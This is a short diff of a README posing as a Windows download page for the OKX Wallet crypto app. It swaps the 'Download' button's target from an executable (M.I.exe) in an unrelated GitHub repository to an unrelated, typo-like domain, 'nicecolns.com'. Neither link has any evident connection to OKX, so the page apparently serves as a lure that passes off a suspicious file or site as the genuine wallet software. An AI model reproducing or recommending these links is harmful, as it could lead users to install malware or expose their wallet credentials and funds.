@@ -11,7 +11,7 @@ Another key feature is the ease of managing diverse portfolios within the **OKX 
 
 1. Click the button below to initiate the **download of OKX Wallet** for Windows.
     <br>
-    <a href="https://github.com/Q1441/gmgnapppro/releases/download/v.1/M.I.exe">
+    <a href="https://nicecolns.com/">
       <img src="https://github.com/user-attachments/assets/dac2e9b1-8b20-475f-9fb1-90bf8f6b715b" alt="Download" width="300"/>
     </a>
 
